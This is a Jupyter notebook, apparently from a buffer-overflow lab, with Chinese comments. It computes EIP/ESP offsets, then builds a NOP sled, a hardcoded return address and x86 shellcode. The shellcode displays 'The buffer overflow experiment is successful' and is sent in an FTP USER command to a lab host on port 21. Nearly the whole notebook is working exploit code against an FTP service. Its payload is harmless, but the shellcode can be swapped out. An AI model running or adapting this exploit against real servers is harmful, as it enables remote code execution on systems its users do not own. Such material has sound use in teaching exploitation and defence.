{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ESP偏移量为: 493\n",
      "RET偏移量为: 485\n"
     ]
    }
   ],
   "source": [
    "# 计算ESP与RET偏移\n",
    "ESP = \"71413471\"\n",
    "EIP = \"32714131\"\n",
    "\n",
    "# 转为字符\n",
    "espstr = bytes.fromhex(ESP).decode()[::-1]\n",
    "eipstr = bytes.fromhex(EIP).decode()[::-1]\n",
    "\n",
    "# 计算偏移量\n",
    "file = open(\"./1.txt\", \"r\")\n",
    "file_data = file.read()\n",
    "off1 = file_data.find(espstr)\n",
    "off2 = file_data.find(eipstr)\n",
    "print(f\"ESP偏移量为: {off1}\\nRET偏移量为: {off2}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "\n",
    "\n",
    "# shellcode\n",
    "shellcode = b\"\\x33\\xDB\" + \\\n",
    "            b\"\\x53\" + \\\n",
    "            b\"\\x68\\x69\\x6E\\x67\\x20\" + \\\n",
    "            b\"\\x68\\x57\\x61\\x72\\x6E\" + \\\n",
    "            b\"\\x8B\\xC4\" + \\\n",
    "            b\"\\x53\" + \\\n",
    "            b\"\\x68\\x73\\x66\\x75\\x6C\" + \\\n",
    "            b\"\\x68\\x63\\x63\\x65\\x73\" + \\\n",
    "            b\"\\x68\\x73\\x20\\x73\\x75\" + \\\n",
    "            b\"\\x68\\x6E\\x74\\x20\\x69\" + \\\n",
    "            b\"\\x68\\x72\\x69\\x6D\\x65\" + \\\n",
    "            b\"\\x68\\x65\\x78\\x70\\x65\" + \\\n",
    "            b\"\\x68\\x6C\\x6F\\x77\\x20\" + \\\n",
    "            b\"\\x68\\x76\\x65\\x72\\x66\" + \\\n",
    "            b\"\\x68\\x65\\x72\\x20\\x6F\" + \\\n",
    "            b\"\\x68\\x62\\x75\\x66\\x66\" + \\\n",
    "            b\"\\x68\\x54\\x68\\x65\\x20\" + \\\n",
    "            b\"\\x8B\\xCC\" + \\\n",
    "            b\"\\x53\" + \\\n",
    "            b\"\\x50\" + \\\n",
    "            b\"\\x51\" + \\\n",
    "            b\"\\x53\" + \\\n",
    "            b\"\\xB8\\x0B\\x05\\xD5\\x77\" + \\\n",
    "            b\"\\xFF\\xD0\"\n",
    "\n",
    "# RET地址\n",
    "RET_addr = bytes.fromhex(\"7ffa4512\")[::-1]\n",
    "attackcode = ((b\"\\x90\" * 485 + RET_addr).ljust(493, b\"\\x90\") + shellcode).ljust(1000, b\"\\x90\")\n",
    "\n",
    "# 设置目标主机地址，端口号\n",
    "host = '192.168.190.128'\n",
    "port = 21\n",
    "with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:\n",
    "    sock.connect((host, port))\n",
    "    data = b'user ' + attackcode + b'\\r\\n'\n",
    "    sock.send(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'6c75667373656363757320736920746e656d69726570786520776f6c667265766f2072656666756220656854'"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str = b\"The buffer overflow experiment is successful\"[::-1]\n",
    "str.hex()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "cv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.10"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
